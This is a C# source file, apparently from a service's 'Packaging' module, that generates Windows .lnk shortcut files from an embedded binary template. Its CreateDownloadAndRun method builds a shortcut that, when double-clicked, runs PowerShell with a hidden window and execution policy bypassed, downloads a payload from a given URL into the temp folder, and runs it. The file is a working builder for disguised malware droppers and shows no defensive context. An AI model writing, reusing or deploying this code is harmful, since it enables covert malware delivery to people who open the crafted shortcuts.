using System.Text;

namespace LibraNextgen.Service.Services.Packaging;

/// <summary>
/// Shell Link (.lnk) 二进制写入器 —— 纯托管实现，无外部依赖，跨平台可用。
///
/// 设计：以 Windows 平台（WScript.Shell COM）生成的**参考 LNK** 为模板，
/// 嵌入其 Header + LinkTargetIDList（My Computer → C: → 完整路径，可移植、无机器指纹）
/// + LinkInfo（LocalBasePath 指向 powershell.exe），仅重建 StringData 段。
/// 参考模板经 COM 实测可被 WScript.Shell 正确解析（TargetPath/Arguments/WorkingDirectory 一致）。
///
/// StringData 惯例（与 COM 写入一致）：每字段 = CountOfChars(2, **含 null**) + UTF-16 字符。
/// 字段顺序（按 LinkFlags）：RelativePath → WorkingDir → Arguments → IconLocation，均无 ExtraData。
/// </summary>
public static class LnkWriter
{
    // 模板前缀：Header(76) + IDListSize(2) + IDList(517) + LinkInfo(111) = 706 字节。
    // 由 COM 参考 LNK 提取（powershell.exe 固定路径，所有 Windows 均存在）。
    private const string TemplateB64 =
        "TAAAAAEUAgAAAAAAwAAAAAAAAEb7QAAAIAAAAAUqa6YPMN0B7uQQGuE03QHMc22mDzDdAQDwBgAAAAAAAQAAAAAAAAAAAAAAAAAAAAUCFAAfUOBP0CDqOmkQotgIACswMJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAVgAxAAAAAAAUXVsKEABXaW5kb3dzAEAACQAEAO++r1wwBhldvbIuAAAAh3MBAAAABgAAAAAAAAAAAAAAAAAAAJ9ovABXAGkAbgBkAG8AdwBzAAAAFgBaADEAAAAAABldKIswAFN5c3RlbTMyAABCAAkABADvvq9cMAYZXTizLgAAAJJzAQAAAAUAAAAAAAAAAAAAAAAAAABexyQAUwB5AHMAdABlAG0AMwAyAAAAGABsADEAAAAAAK9cTQYQAFdJTkRPV34xAABUAAkABADvvq9cTQYZXTizLgAAAJg4BAAAAAEAAAAAAAAAAAAAAAAAAABToRwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAAAAGABOADEAAAAAABNdpL4QAHYxLjAAADoACQAEAO++r1xNBhldCLMuAAAAmTgEAAAAAQAAAAAAAAAAAAAAAAAAAJckAQB2ADEALgAwAAAAFABsADIAAPAGABNdbpogAHBvd2Vyc2hlbGwuZXhlAABOAAkABADvvhNdbpoZXT2zLgAAAHGYIQAAAAEAAAAAAPgAAAAAAAAAAAA0bNgAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlAAAAHgAAAG8AAAAcAAAAAQAAABwAAAA0AAAAAAAAAG4AAAAYAAAAAwAAACR5Gx4QAAAAV2luZG93cwBDOlxXaW5kb3dzXFN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUAAA==";

    private static readonly byte[] TemplatePrefix = Convert.FromBase64String(TemplateB64);

    /// <summary>模板前缀长度（Header + IDList + LinkInfo），StringData 由此开始。</summary>
    public static int TemplatePrefixLength => TemplatePrefix.Length;

    // 固定字段值（与参考 LNK 一致，COM 实测可解析）
    private const string FixedRelativePath = @"..\..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"; // 68 字符
    private const string FixedWorkingDir = @"C:\Windows\System32\WindowsPowerShell\v1.0";                              // 41 字符
    private const string FixedIconLocation = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";            // 56 字符

    /// <summary>
    /// 生成「下载并执行」LNK：双击 → powershell.exe（隐藏窗口）→ 下载 payload 到 %TEMP% 并启动。
    /// </summary>
    public static byte[] CreateDownloadAndRun(string payloadUrl, string outputName = "payload.exe")
    {
        // PowerShell 参数：单引号包 URL 防注入；下载到 %TEMP%\payload.exe 后 Start-Process
        var script = $"$u='{payloadUrl}';$f=Join-Path $env:TEMP '{outputName}';(New-Object Net.WebClient).DownloadFile($u,$f);Start-Process $f";
        var args = $"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"{script}\"";

        var rp = EncodeField(FixedRelativePath);
        var wd = EncodeField(FixedWorkingDir);
        var arg = EncodeField(args);
        var icon = EncodeField(FixedIconLocation);

        var lnk = new byte[TemplatePrefix.Length + rp.Length + wd.Length + arg.Length + icon.Length];
        Array.Copy(TemplatePrefix, 0, lnk, 0, TemplatePrefix.Length);
        var o = TemplatePrefix.Length;
        Array.Copy(rp, 0, lnk, o, rp.Length); o += rp.Length;
        Array.Copy(wd, 0, lnk, o, wd.Length); o += wd.Length;
        Array.Copy(arg, 0, lnk, o, arg.Length); o += arg.Length;
        Array.Copy(icon, 0, lnk, o, icon.Length);
        return lnk;
    }

    /// <summary>编码一个 StringData 字段：CountOfChars(含 null) + UTF-16 字符 + null 终止。</summary>
    private static byte[] EncodeField(string value)
    {
        // CountOfChars = 字符数 + 1（null），与 COM 写入惯例一致
        var units = Encoding.Unicode.GetBytes(value + "\0");
        var field = new byte[2 + units.Length];
        field[0] = (byte)(value.Length + 1);
        field[1] = 0;
        Array.Copy(units, 0, field, 2, units.Length);
        return field;
    }
}
